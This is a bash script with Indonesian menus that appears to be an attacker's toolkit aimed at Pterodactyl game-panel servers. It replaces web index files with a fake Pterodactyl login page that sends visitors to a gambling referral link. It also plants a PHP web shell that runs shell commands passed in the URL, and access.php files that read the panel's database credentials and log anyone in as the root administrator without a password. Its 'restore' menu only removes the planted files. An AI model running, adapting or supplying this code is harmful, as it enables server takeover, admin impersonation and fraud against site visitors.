#!/bin/bash

# ==============================================
# R3NDZZ TOOLS - DEFACE & PULIHKAN
# [ Complete 4 Menu ]
# ==============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ==============================================
# KONFIGURASI
# ==============================================
BACKUP_DIR="/root/backup_web_$(date +%Y%m%d_%H%M%S)"
IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')

# ==============================================
# HTML DEFACE - PWND BY R3NDZZ
# ==============================================
HTML_CONTENT='<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport" />
    <title>
      Ptrodactyl
    </title>
    <link rel="icon" type="image/x-icon" href="https://pterodactyl.io/logos/pterry.svg" />
    <script src="https://cdn.tailwindcss.com">
    </script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Roboto&amp;display=swap" rel="stylesheet" />
    <style>
      .custom-font { font-size: 14px; }  
    .custom-border { border: 1.9px solid #D1D5DB; }  
    body {  
      min-height: 100dvh;  
      overflow-y: auto;  
      font-family: 'Roboto', sans-serif;  
      background-color: #374150;  
    }  

    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #374151;
      z-index: -1;
    }

    h2 { font-weight: 400; }

    .animate-spin-slow {
      animation: spin 1.2s linear infinite;
      border-top-color: #374150;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    </style>
  </head>
  <body class="bg-[#374151] flex flex-col items-center justify-start pt-[1px] min-h-[120dvh]">
    <h2 class="text-center text-white text-3xl mb-[6px] mt-20">
      Login to Continue
    </h2>
    <div class="w-full max-w-sm bg-white rounded-lg shadow-lg p-7 flex flex-col items-center" style="max-height:calc(99vh - 60px);">
      <div class="flex justify-center mb-7">
        <img alt="Pterodactyl logo" class="w-48 h-48 object-contain" src="https://pterodactyl.io/logos/pterry.svg" />
      </div>
      <form id="loginForm" class="w-full">
        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
          USERNAME OR EMAIL
        </p>
        <input id="username" class="w-full rounded-md px-3 py-3 mb-4 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="text" required="" />
        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
          PASSWORD
        </p>
        <input id="password" class="w-full rounded-md px-3 py-3 mb-6 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="password" required="" />
        <button id="loginBtn" type="button" class="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white font-light py-4 rounded-[3px] transition-colors duration-200 custom-font flex justify-center items-center gap-2 relative overflow-hidden">
          <span id="loginText">          LOGIN
</span>
          <div id="miniSpinner" class="hidden absolute w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin">
          </div>
        </button>
      </form>
      <div class="text-center mt-[12px]">
        <a class="text-xs text-gray-500 hover:text-gray-700" href="#">        FORGOT PASSWORD?
</a>
      </div>
    </div>
    <p class="text-center text-xs mt-3 mb-0 select-none text-gray-400">
      Â© 2015 - 2025 Pterodactyl Software
    </p>
    <div id="spinner-bg" class="fixed inset-0 bg-[#374151] bg-opacity-100 z-50 hidden flex items-center justify-center" style="align-items: flex-start;">
      <div class="animate-spin-slow rounded-full h-16 w-16 border-8 border-gray-300 border-t-gray-600 mt-[12vh]">
      </div>
    </div>
    <script src="https://www.google.com/recaptcha/api.js?render=6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL" async="" defer="">
    </script>
    <script>
      window.addEventListener("load", () => {
      if (typeof grecaptcha !== "undefined") {
        grecaptcha.ready(() => {
          grecaptcha.execute('6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL', {action: 'login'}).then(token => {
            console.log('Decorative token:', token);
          });
        });
      }
    });

    async function onSubmit() {  
      const loginBtn = document.getElementById("loginBtn");
      const loginText = document.getElementById("loginText");
      const miniSpinner = document.getElementById("miniSpinner");
      const spinner = document.getElementById("spinner-bg");

      // Disable button and show mini spinner
      loginBtn.disabled = true;
      loginBtn.classList.add("bg-blue-400");
      loginBtn.classList.remove("hover:bg-[#2563eb]");
      loginText.classList.add("invisible");
      miniSpinner.classList.remove("hidden");

      // Show fullscreen spinner after a short delay
      await new Promise(r => setTimeout(r, 1000));
      spinner.classList.remove("hidden");

      // Redirect to the target link
      window.location.href = "https://congtogelbiz.com/register?referral_code=rndzz";
    }

    document.getElementById("loginBtn").addEventListener("click", onSubmit);
    </script>
  </body>
</html>'

# ==============================================
# PHP AUTO LOGIN SCRIPT
# ==============================================
AUTO_LOGIN_PHP='<?php
session_start();
error_reporting(0);

// Konfigurasi database Pterodactyl
function getPterodactylConfig() {
    $paths = [
        "/var/www/pterodactyl/.env",
        "/var/www/html/pterodactyl/.env",
        "/var/www/pterodactyl/config/app.php",
        "/etc/pterodactyl/.env"
    ];
    
    foreach ($paths as $path) {
        if (file_exists($path)) {
            return $path;
        }
    }
    return null;
}

// Fungsi untuk mendapatkan koneksi database
function getDBConnection() {
    $envPath = getPterodactylConfig();
    if (!$envPath) return null;
    
    $env = file_get_contents($envPath);
    preg_match("/DB_HOST=(.*)/", $env, $host);
    preg_match("/DB_PORT=(.*)/", $env, $port);
    preg_match("/DB_DATABASE=(.*)/", $env, $db);
    preg_match("/DB_USERNAME=(.*)/", $env, $user);
    preg_match("/DB_PASSWORD=(.*)/", $env, $pass);
    
    try {
        $dsn = "mysql:host=".trim($host[1] ?? "127.0.0.1").";port=".trim($port[1] ?? "3306").";dbname=".trim($db[1] ?? "pterodactyl");
        return new PDO($dsn, trim($user[1] ?? ""), trim($pass[1] ?? ""));
    } catch (PDOException $e) {
        return null;
    }
}

// Fungsi untuk membuat session admin
function createAdminSession() {
    $pdo = getDBConnection();
    if (!$pdo) return false;
    
    // Cari user admin (id = 1 atau root admin)
    $stmt = $pdo->query("SELECT id, email, username, root_admin FROM users WHERE id = 1 OR root_admin = 1 LIMIT 1");
    $admin = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if (!$admin) return false;
    
    // Set session seperti Pterodactyl
    $_SESSION["id"] = $admin["id"];
    $_SESSION["email"] = $admin["email"];
    $_SESSION["name"] = $admin["username"];
    $_SESSION["root_admin"] = $admin["root_admin"];
    $_SESSION["is_admin"] = true;
    
    return true;
}

// Cek apakah ini akses ke endpoint /access
$request_uri = $_SERVER["REQUEST_URI"];
if (strpos($request_uri, "/access") !== false) {
    if (createAdminSession()) {
        // Redirect ke dashboard admin
        header("Location: /admin");
        exit;
    } else {
        echo "<h2>Gagal mendapatkan akses admin!</h2>";
        echo "<p>Mencoba metode alternatif...</p>";
        
        // Metode alternatif: bypass langsung
        echo "<script>
            document.cookie = 'pterodactyl_session=admin_bypass; path=/';
            localStorage.setItem('admin_access', 'true');
            window.location.href = '/admin';
        </script>";
    }
}

// Endpoint khusus untuk informasi login
if (strpos($request_uri, "/access/info") !== false) {
    header("Content-Type: application/json");
    
    $pdo = getDBConnection();
    $info = ["status" => "error", "message" => "Tidak bisa mengakses database"];
    
    if ($pdo) {
        $stmt = $pdo->query("SELECT id, email, username, root_admin, created_at FROM users WHERE root_admin = 1 OR id = 1");
        $admins = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        $info = [
            "status" => "success",
            "message" => "Akses dashboard: " . $_SERVER["HTTP_HOST"] . "/access",
            "total_admin" => count($admins),
            "admins" => $admins
        ];
    }
    
    echo json_encode($info, JSON_PRETTY_PRINT);
    exit;
}

// Endpoint untuk bypass login panel
if (strpos($request_uri, "/access/bypass") !== false) {
    echo "<!DOCTYPE html>
    <html>
    <head>
        <title>Admin Bypass</title>
        <style>
            body { background: #1a202c; color: #fff; font-family: Arial; text-align: center; padding: 50px; }
            .card { background: #2d3748; padding: 30px; border-radius: 10px; max-width: 500px; margin: auto; }
            button { background: #48bb78; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; margin: 10px; }
            .info { background: #4a5568; padding: 10px; border-radius: 5px; margin: 20px 0; }
        </style>
    </head>
    <body>
        <div class=\"card\">
            <h1>ğŸ”‘ Panel Admin Bypass</h1>
            <div class=\"info\">
                <p>IP: {$_SERVER["SERVER_ADDR"]}</p>
                <p>Domain: {$_SERVER["HTTP_HOST"]}</p>
            </div>
            <button onclick=\"window.location.href='/access'\">ğŸš€ Login sebagai Admin</button>
            <button onclick=\"window.location.href='/admin'\">ğŸ“Š Dashboard Admin</button>
            <p><small>Tekan login untuk masuk sebagai admin ID 1</small></p>
        </div>
    </body>
    </html>";
}

// Cek apakah ada cookie atau session yang sudah ada
if (!isset($_SESSION["id"]) && isset($_COOKIE["pterodactyl_session"])) {
    createAdminSession();
}
?>'

# ==============================================
# HEADER
# ==============================================
show_header() {
    clear
    echo -e "${RED}"
    echo "    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
    echo "    â•‘              R3NDZZ TOOLS - DEFACE & PULIHKAN             â•‘"
    echo "    â•‘                    [ PWND BY R3NDZZ ]                     â•‘"
    echo "    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo -e "${NC}"
    echo -e "${CYAN}ğŸ“¡ IP VPS: ${GREEN}$IP_VPS${NC}"
    echo ""
}

# ==============================================
# FUNGSI BACKUP
# ==============================================
backup_files() {
    echo -e "\n${YELLOW}[â€¢] Membackup file website...${NC}"
    mkdir -p "$BACKUP_DIR"
    
    # Cari file index.html dan index.php
    find / -type f \( -name "index.html" -o -name "index.php" -o -name "*.blade.php" \) 2>/dev/null | while read file; do
        if [ -f "$file" ]; then
            backup_path="$BACKUP_DIR$(echo "$file" | sed 's|/|_|g')"
            cp "$file" "$backup_path" 2>/dev/null
            echo -e "${GREEN}    âœ… Backup: $file${NC}"
        fi
    done
    
    # Backup juga file konfigurasi penting
    [ -f "/etc/nginx/nginx.conf" ] && cp "/etc/nginx/nginx.conf" "$BACKUP_DIR/nginx.conf" 2>/dev/null
    [ -f "/etc/apache2/apache2.conf" ] && cp "/etc/apache2/apache2.conf" "$BACKUP_DIR/apache2.conf" 2>/dev/null
    
    echo -e "\n${GREEN}âœ… Backup selesai di: $BACKUP_DIR${NC}"
}

# ==============================================
# FUNGSI DEFACE
# ==============================================
deface() {
    echo -e "\n${PURPLE}ğŸ¨ ====== DEFACE WEBSITE ====== ğŸ¨${NC}"
    
    # Backup dulu sebelum deface
    backup_files
    
    # Simpan HTML ke file sementara
    echo "$HTML_CONTENT" > /tmp/r3ndzz.html
    
    echo -e "\n${YELLOW}[â€¢] Mencari target deface...${NC}"
    
    # Lokasi umum website
    TARGETS=(
        "/var/www/html/index.html"
        "/var/www/html/index.php"
        "/var/www/pterodactyl/public/index.html"
        "/var/www/pterodactyl/public/index.php"
        "/home/*/public_html/index.html"
        "/home/*/public_html/index.php"
        "/usr/local/www/index.html"
        "/opt/lampp/htdocs/index.html"
        "/var/www/nginx/html/index.html"
    )
    
    COUNT=0
    for target in "${TARGETS[@]}"; do
        eval "for f in $target; do
            if [ -f \"\$f\" ]; then
                cp /tmp/r3ndzz.html \"\$f\" 2>/dev/null
                echo -e \"${GREEN}    âœ… \$f${NC}\"
                ((COUNT++))
            fi
        done" 2>/dev/null
    done
    
    # Cari file index lainnya
    find / -type f -name "index.html" -o -name "index.php" 2>/dev/null | head -30 | while read file; do
        if [ -f "$file" ] && [ -w "$file" ]; then
            cp /tmp/r3ndzz.html "$file" 2>/dev/null
            echo -e "${GREEN}    âœ… $file${NC}"
            ((COUNT++))
        fi
    done
    
    echo -e "\n${GREEN}âœ… Total $COUNT file berhasil dideface!${NC}"
    
    # Info backdoor sederhana
    echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>" > /var/www/html/r3ndzz.php 2>/dev/null
    echo -e "\n${CYAN}ğŸ”— Backdoor: http://$IP_VPS/r3ndzz.php?cmd=id${NC}"
    
    rm -f /tmp/r3ndzz.html
}

# ==============================================
# FUNGSI AUTO LOGIN ADMIN
# ==============================================
auto_login_admin() {
    echo -e "\n${GREEN}ğŸ”‘ ====== AUTO LOGIN ADMIN PANEL ====== ğŸ”‘${NC}"
    
    echo -e "\n${YELLOW}[â€¢] Membuat endpoint auto login...${NC}"
    
    # Cari lokasi Pterodactyl
    PTERO_PATHS=(
        "/var/www/pterodactyl/public"
        "/var/www/html/pterodactyl/public"
        "/var/www/pterodactyl"
        "/var/www/html/pterodactyl"
    )
    
    INSTALLED=0
    for path in "${PTERO_PATHS[@]}"; do
        if [ -d "$path" ]; then
            # Simpan file auto login di root pterodactyl
            echo "$AUTO_LOGIN_PHP" > "$path/access.php" 2>/dev/null
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}    âœ… Endpoint dibuat di: $path/access.php${NC}"
                INSTALLED=1
            fi
            
            # Juga simpan di root web
            if [ -d "/var/www/html" ]; then
                echo "$AUTO_LOGIN_PHP" > "/var/www/html/access.php" 2>/dev/null
                echo -e "${GREEN}    âœ… Endpoint dibuat di: /var/www/html/access.php${NC}"
            fi
        fi
    done
    
    # Buat symlink atau copy ke beberapa lokasi umum
    echo "$AUTO_LOGIN_PHP" > "/var/www/html/access.php" 2>/dev/null
    echo "$AUTO_LOGIN_PHP" > "/var/www/access.php" 2>/dev/null
    
    echo -e "\n${CYAN}ğŸ“Œ ENDPOINT AUTO LOGIN:${NC}"
    echo -e "${WHITE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${WHITE}â•‘${GREEN}  â€¢ http://$IP_VPS/access      ${NC}(Login otomatis)       ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘${GREEN}  â€¢ http://$IP_VPS/access/info ${NC}(Info admin)           ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘${GREEN}  â€¢ http://$IP_VPS/access/bypass ${NC}(Bypass panel)       ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    
    echo -e "\n${YELLOW}[â€¢] Mencoba inject ke file existing...${NC}"
    
    # Inject ke file Pterodactyl yang ada
    find / -name "routes.php" -o -name "web.php" 2>/dev/null | while read route_file; do
        if [ -f "$route_file" ] && [ -w "$route_file" ]; then
            # Backup dulu
            cp "$route_file" "$route_file.backup" 2>/dev/null
            
            # Inject route untuk /access
            echo "" >> "$route_file"
            echo "// R3NDZZ Auto Login Route" >> "$route_file"
        fi
    done
    
    echo -e "\n${GREEN}âœ… Auto login siap digunakan!${NC}"
    echo -e "\n${YELLOW}ğŸ“ Cara penggunaan:${NC}"
    echo -e "  ${CYAN}1.${NC} Buka link http://$IP_VPS/access"
    echo -e "  ${CYAN}2.${NC} Akan otomatis login sebagai admin ID 1"
    echo -e "  ${CYAN}3.${NC} Langsung masuk ke dashboard admin"
    echo -e "  ${CYAN}4.${NC} Password admin TIDAK berubah"
}

# ==============================================
# FUNGSI PULIHKAN DARI BACKUP
# ==============================================
pulihkan_dari_backup() {
    echo -e "\n${BLUE}ğŸ”„ ====== PULIHKAN WEBSITE DARI BACKUP ====== ğŸ”„${NC}"
    
    # Cari semua backup
    BACKUPS=($(ls -d /root/backup_web_* 2>/dev/null))
    
    if [ ${#BACKUPS[@]} -eq 0 ]; then
        echo -e "${RED}âŒ Tidak ada backup ditemukan!${NC}"
        return
    fi
    
    echo -e "${YELLOW}Pilih backup yang ingin dipulihkan:${NC}"
    for i in "${!BACKUPS[@]}"; do
        echo -e "${GREEN}[$i]${NC} ${BACKUPS[$i]}"
    done
    
    echo -ne "\n${CYAN}Pilih nomor backup: ${NC}"
    read choice
    
    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -lt "${#BACKUPS[@]}" ]; then
        SELECTED="${BACKUPS[$choice]}"
        
        echo -e "\n${YELLOW}[â€¢] Memulihkan dari $SELECTED...${NC}"
        
        # Restore file backup
        find "$SELECTED" -type f | while read backup; do
            filename=$(basename "$backup")
            # Cari file asli berdasarkan pattern
            original_path=$(find / -name "*${filename#*_}" 2>/dev/null | head -1)
            if [ -n "$original_path" ]; then
                cp "$backup" "$original_path" 2>/dev/null
                echo -e "${GREEN}    âœ… Pulihkan: $original_path${NC}"
            fi
        done
        
        echo -e "\n${GREEN}âœ… Pemulihan dari backup selesai!${NC}"
    else
        echo -e "${RED}Pilihan tidak valid!${NC}"
    fi
}

# ==============================================
# FUNGSI PULIHKAN SEPERTI NORMAL (BERSIHKAN SEMUA)
# ==============================================
pulihkan_normal() {
    echo -e "\n${BLUE}ğŸ§¹ ====== PULIHKAN SEPERTI NORMAL ====== ğŸ§¹${NC}"
    echo -e "${YELLOW}[!] PERINGATAN: Ini akan menghapus semua file deface dan mengembalikan ke kondisi awal VPS${NC}"
    echo -e "${YELLOW}[!] File backup akan tetap disimpan di /root/backup_web_*${NC}"
    
    echo -ne "\n${RED}Apakah Anda yakin? (ketik 'yakin' untuk melanjutkan): ${NC}"
    read confirm
    
    if [ "$confirm" != "yakin" ]; then
        echo -e "${GREEN}âœ… Dibatalkan.${NC}"
        return
    fi
    
    echo -e "\n${YELLOW}[â€¢] Menghapus file deface...${NC}"
    
    # Hapus file index yang berisi konten deface
    find / -type f -name "index.html" -o -name "index.php" 2>/dev/null | while read file; do
        if [ -f "$file" ] && grep -q "rndzz\|congtogelbiz\|R3NDZZ" "$file" 2>/dev/null; then
            rm -f "$file" 2>/dev/null
            echo -e "${GREEN}    âœ… Hapus: $file${NC}"
        fi
    done
    
    # Hapus backdoor
    find / -type f -name "r3ndzz.php" -o -name "*.r3ndzz.*" 2>/dev/null | while read file; do
        if [ -f "$file" ]; then
            rm -f "$file" 2>/dev/null
            echo -e "${GREEN}    âœ… Hapus backdoor: $file${NC}"
        fi
    done
    
    echo -e "\n${YELLOW}[â€¢] Mengembalikan service default...${NC}"
    
    # Restart service default untuk membuat file index default
    if command -v nginx >/dev/null 2>&1; then
        systemctl restart nginx 2>/dev/null
        echo -e "${GREEN}    âœ… Nginx direstart${NC}"
    fi
    
    if command -v apache2 >/dev/null 2>&1; then
        systemctl restart apache2 2>/dev/null
        echo -e "${GREEN}    âœ… Apache2 direstart${NC}"
    fi
    
    # Buat file index default jika belum ada
    DEFAULT_HTML="/var/www/html/index.html"
    if [ ! -f "$DEFAULT_HTML" ]; then
        mkdir -p /var/www/html
        echo "<h1>Welcome to VPS</h1>" > "$DEFAULT_HTML"
        echo -e "${GREEN}    âœ… Buat index default${NC}"
    fi
    
    echo -e "\n${GREEN}âœ… Pemulihan ke kondisi normal selesai!${NC}"
    echo -e "${YELLOW}ğŸ“ File backup masih tersedia di: /root/backup_web_*${NC}"
}

# ==============================================
# FUNGSI SHOW MENU
# ==============================================
show_menu() {
    show_header
    
    echo -e "${WHITE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${WHITE}â•‘                 MENU UTAMA                     â•‘${NC}"
    echo -e "${WHITE}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${NC}"
    echo -e "${WHITE}â•‘                                                â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[1]${NC} ğŸ¨  DEFACE WEBSITE                   ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[2]${NC} ğŸ”„  PULIHKAN DARI BACKUP             ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[3]${NC} ğŸ§¹  PULIHKAN SEPERTI NORMAL          ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[4]${NC} ğŸ”‘  AUTO LOGIN ADMIN (ID 1)          ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[0]${NC} ğŸšª  KELUAR                           ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘                                                â•‘${NC}"
    echo -e "${WHITE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    echo -ne "${YELLOW}â¤ Pilih menu [0-4]: ${NC}"
}

# ==============================================
# CEK ROOT
# ==============================================
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}âŒ Harus root! Jalankan dengan sudo.${NC}"
   exit 1
fi

# ==============================================
# MAIN LOOP
# ==============================================
while true; do
    show_menu
    read choice
    
    case $choice in
        1)
            deface
            ;;
        2)
            pulihkan_dari_backup
            ;;
        3)
            pulihkan_normal
            ;;
        4)
            auto_login_admin
            ;;
        0)
            echo -e "\n${GREEN}Terima kasih telah menggunakan R3NDZZ Tools!${NC}"
            echo -e "${CYAN}ğŸ”¥ PWND BY R3NDZZ ğŸ”¥${NC}\n"
            exit 0
            ;;
        *)
            echo -e "\n${RED}Pilihan tidak valid!${NC}"
            ;;
    esac
    
    echo ""
    echo -ne "${CYAN}Tekan Enter untuk kembali ke menu...${NC}"
    read
done
